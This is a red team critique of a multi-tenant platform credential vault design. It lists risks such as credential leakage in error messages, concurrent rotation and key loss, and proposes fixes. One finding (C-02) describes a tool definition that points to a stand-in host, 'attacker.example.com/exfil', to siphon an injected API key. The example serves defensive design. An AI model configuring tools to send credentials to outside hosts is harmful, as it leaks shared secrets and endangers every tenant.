# Platform Credential Vault — Red Team Critique

**Date**: 2026-03-23
**Status**: Complete — 7 Critical, 9 Major, 12 Significant gaps identified
**References**: `01-gap-and-risk-analysis.md`, `02-requirements-and-adr.md`

---

## Summary

7 Critical risks require resolution before any code is written. The most dangerous cluster: **credential leakage via third-party error messages** (C-01), **SSRF via tool endpoint redirection** (C-02), and **silent false-positive in the test harness** (already the current state — a test that "passes" with no credentials stored).

---

## CRITICAL RISKS

### C-01: Third-Party Error Message Credential Leakage

**The failure.** PitchBook returns `{"error": "Invalid API key: sk-live-abc123"}` in its error response. This propagates through the tool executor → orchestrator → logs → potentially LLM context (if error is fed back for retry reasoning) → user-facing response.

**Why it's critical.** The security invariant states "values never in API responses, logs, or errors." But the platform cannot control what third-party APIs include in their error bodies.

**Fix.** Implement `CredentialScrubber` — a request-scoped object that holds all resolved credential values for the current execution and scrubs any substring match from all error messages, log entries, and LLM context before they leave the tool execution boundary.

```python
class CredentialScrubber:
    def __init__(self, resolved: dict[str, str]):
        self._values = list(resolved.values())

    def scrub(self, text: str) -> str:
        for val in self._values:
            if val and len(val) > 4:
                text = text.replace(val, "[REDACTED]")
        return text
```

The scrubber must operate on raw strings. Credential values can appear in any JSON field.

---

### C-02: SSRF via Credential Injection to Attacker Endpoint

**The failure.** A tenant admin creates a tool definition with `endpoint_url = "https://attacker.example.com/exfil"` and `required_credentials: ["pitchbook_api_key"]`. The orchestrator resolves the platform credential and injects it into a request to the attacker's server.

**Why it's critical.** Platform credentials are shared across all tenants. One compromised tool definition exposes the key to extraction. All tenants' access to PitchBook is then at risk.

**Fix.** Every stored platform credential MUST include `allowed_domains: ["api.pitchbook.com"]`. At resolve time, the orchestrator validates the tool's target URL against `allowed_domains`. Mismatch → block, write `credential_injection_blocked` audit event, return tool error.

Platform admin sets `allowed_domains` at store time. No tenant can modify this field.

---

### C-03: Concurrent Rotation — No Last-Writer-Wins Protection

**The failure.** Two platform admins rotate the same key simultaneously. The second write silently overwrites the first. If the first rotation was triggered by a key compromise, the replacement is silently discarded — the compromised key remains active.

**Fix.** Add `version` (integer, auto-increment) to `platform_credential_metadata`. PUT /rotate requires `If-Match: {version}` header. Version mismatch → 409 Conflict. Version returned in every write response.

---

### C-04: Mid-Execution Credential Deletion

**The failure.** Platform admin soft-deletes a credential while an agent is mid-execution. The next tool call in the same orchestration fails to resolve the credential. If the agent has already sent an email or updated a record, the partial execution leaves inconsistent state.

**Fix.** The orchestrator performs **eager resolution** — all required platform credentials are resolved at orchestration START before any tool call. Resolved values are stored in the request's execution context for the duration of the request. Credential mutations during execution do not affect the current request.

Additionally: if any required credential is missing at orchestration start, fail fast with a clear error before any side effects occur.

---

### C-05: Platform Admin Account Compromise

**The failure.** A compromised platform admin account can rotate all credentials to attacker-controlled values, or (via C-02) extract them. No secondary approval. No anomaly detection.

**Mitigations (layered):**
1. **Phase 1 minimum**: Alert on rotation of more than 3 credentials within 10 minutes. Alert on credential operations outside business hours or from a new IP.
2. **Phase 2**: Step-up authentication (TOTP/WebAuthn challenge) on credential write operations.
3. **Phase 2**: Dual-approval for bulk rotations (>3 keys in 1 hour requires a second platform admin's approval).

---

### C-06: Fernet Key Loss = Permanent Credential Loss

**The failure.** `PLATFORM_CREDENTIAL_ENCRYPTION_KEY` is not set, is rotated without migrating credentials, or the file is backed up without the key. All stored credentials become permanently unrecoverable.

**Fixes:**
1. If `PLATFORM_CREDENTIAL_ENCRYPTION_KEY` is not set AND `VAULT_ADDR` is not set, the application **MUST raise a startup error**. No silent fallback.
2. Implement admin CLI: `migrate-platform-credentials --old-key X --new-key Y` — decrypts with old key, re-encrypts with new key.
3. Startup canary check: attempt to decrypt a stored test value to verify key validity.
4. Document: the Fernet key MUST be backed up in the same procedure as the credentials file.

---

### C-07: Tenant ID "platform" Namespace Collision

**The failure.** If a tenant is created with ID `platform`, its vault path (`platform/agents/{agent_id}/{key}`) could collide with the platform namespace (`platform/templates/{template_id}/{key}`). Depending on vault path resolution, a tenant admin could read or overwrite platform credentials.

**Fix.** Tenant creation MUST reject reserved IDs: `platform`, `system`, `__platform__`, and any ID starting with `__`. Validate at the CredentialManager level as defense-in-depth: reject operations where the resolved path starts with the platform prefix and the caller is not platform_admin.

---

## MAJOR RISKS

### M-01: Soft-Delete UNIQUE Constraint Blocks Immediate Re-Provisioning

**The failure.** Admin accidentally deletes `PITCHBOOK_API_KEY`. All agents using PitchBook break. Admin immediately tries to re-store the key. Gets a unique constraint violation. Must wait 30 days (until hard-delete) or manually bypass.

**Fix.** Use a **partial unique index** instead of a table-level UNIQUE constraint:

```sql
CREATE UNIQUE INDEX uq_pcm_active ON platform_credential_metadata(template_id, key)
    WHERE deleted_at IS NULL;
```

This allows a new `PITCHBOOK_API_KEY` row to be inserted immediately after soft-delete. The old (soft-deleted) row remains in the audit trail.

---

### M-02: No Cross-Template Credential Sharing

**The failure.** The same PitchBook enterprise license key must be stored N times for N templates. Rotation requires updating N templates independently. Miss one → stale key.

**Deferred to Phase 2.** Introduce `platform/shared/{key}` vault paths. Templates reference shared credentials: `required_credentials: [{key: "pitchbook_api_key", source: "shared"}]`. Rotation of a shared credential propagates to all templates that reference it.

---

### M-03: Template Deprecation Orphans Credentials

**The failure.** When a template is deprecated, its platform credentials remain active in the vault indefinitely. These are live API keys consuming licenses and presenting a breach surface.

**Deferred to Phase 2.** Template deprecation triggers a `pending_cleanup` state on associated credentials. After a configurable grace period (90 days), credentials are hard-deleted from the vault and the third-party API key should be revoked.

---

### M-04: Audit Records Lack Tenant Context for Runtime Resolutions

**The failure.** Audit shows `actor_id = "runtime"` for query-time credential resolutions. SOC 2 / ISO 27001 requires tracing a credential access back to the tenant and user whose query triggered it.

**Fix.** Add `tenant_id` and `request_id` columns to `platform_credential_audit`. The orchestrator passes tenant context and correlation ID to `resolve_platform_credentials`. Audit entries for runtime reads include `tenant_id`, `request_id`, and pseudonymized `user_id`.

---

### M-05: Dev/Prod Parity Gap

**The failure.** Fernet (dev) and HashiCorp Vault (prod) have different failure modes. Tests passing against Fernet provide zero confidence about Vault-specific failures: token expiry, auto-unseal, lease expiry, network partition.

**Phase 2 fix.** Integration test suite using Vault dev server in Docker. `CredentialManager` defines explicit exception types (`VaultSealedError`, `VaultTokenExpiredError`, `VaultNetworkError`) that both backends implement. Fernet backend simulates these via config flags.

---

### M-06: Template Versioning Credential Migration

**The failure.** When a template is versioned (v1 → v2), the design does not specify what happens to platform credentials. If `required_credentials` changes between versions, the publish gate may fail unexpectedly.

**Interim behavior (Phase 1):** Credentials are stored per `template_id` (not per version). All versions of a template share the same credential store. If `required_credentials` changes on a new version, the publish gate compares the NEW version's `required_credentials` against the existing credential store — additional keys must be added before publishing.

**Phase 2:** Version-aware vault paths (`platform/templates/{template_id}/v{version}/{key}`) with auto-copy on version creation.

---

### M-08: Plaintext Credential in POST Body at Load Balancer

**The failure.** If the load balancer is configured to log request bodies (common in debug configurations), or a WAF inspects payloads, the credential value appears in infrastructure logs outside the platform's control.

**Phase 1 minimum:** Document that `/credentials` endpoints MUST be on the WAF body-logging exclusion list. Add `Cache-Control: no-store` + `Pragma: no-cache` headers. Enforce TLS 1.2+ minimum.

**Phase 2:** Client-side envelope encryption: platform provides a public key; the admin's browser encrypts the value before sending. Server decrypts with private key before passing to vault.

---

## SIGNIFICANT RISKS

| ID | Risk | Mitigation Priority |
|---|---|---|
| S-01 | No credential expiry/rotation reminder | P2: metadata `expires_at` field + dashboard alerts |
| S-02 | No caching — every query hits vault | P1: 5-min TTL in-memory cache with Redis invalidation on rotate |
| S-03 | No rollback on failed rotation | P2: Vault KV v2 retains versions; expose rollback API |
| S-04 | No audit log tamper detection | P3: HMAC chain on audit rows |
| S-05 | No differentiation: "never stored" vs "soft-deleted" in health check | P1: health endpoint returns "missing" or "revoked" separately |
| S-06 | Health endpoint exposes schema to enumeration | P1: ensure health endpoint is platform_admin only |
| S-07 | No credential connectivity test (ping the API) | P2: POST /credentials/test endpoint — makes real HTTP ping |
| S-08 | No bulk import/export for DR | P3: admin CLI only, not API endpoint |
| S-09 | No geographic affinity for vault storage | P3: Vault namespaces per region |
| S-10 | Fernet file lacks enforced file permissions | P0: `os.chmod(path, 0o600)` on every write (already done for tenant creds — extend to platform) |
| S-11 | No credential usage metrics | P2: count vault reads per template per day |
| S-12 | Memory residency of decrypted values | P2: `SecretStr` wrapper, zero on GC, disable core dumps in prod |

---

## Decision Points Requiring Stakeholder Input

| # | Question | Impact if deferred |
|---|---|---|
| 1 | **Shared credentials (M-02)**: Cross-template sharing in Phase 1 or Phase 2? | Rotation burden N×templates in Phase 1 |
| 2 | **MFA step-up (C-05)**: Is Auth0 step-up authentication feasible for credential writes? | No secondary approval guard on credential operations |
| 3 | **Load balancer body logging (M-08)**: Infrastructure team willing to guarantee no body logging on `/credentials` paths? | Credentials may appear in infra logs |
| 4 | **Data residency (S-09)**: Any near-term customers with API key data residency requirements? | Single-region vault may violate enterprise contracts |
| 5 | **Rotation propagation SLA (S-02)**: Is 5-minute maximum delay acceptable, or near-instant required? | 5-min caching vs no caching (vault load) |
| 6 | **Soft-delete retention (M-01)**: Is 30 days correct, or should platform admin be able to override per credential? | Emergency re-provision blocked for 30 days without partial unique index fix |
| 7 | **Publish gate strictness**: Block publish if credentials missing, or warn and allow? | Templates can ship broken if warning-only |
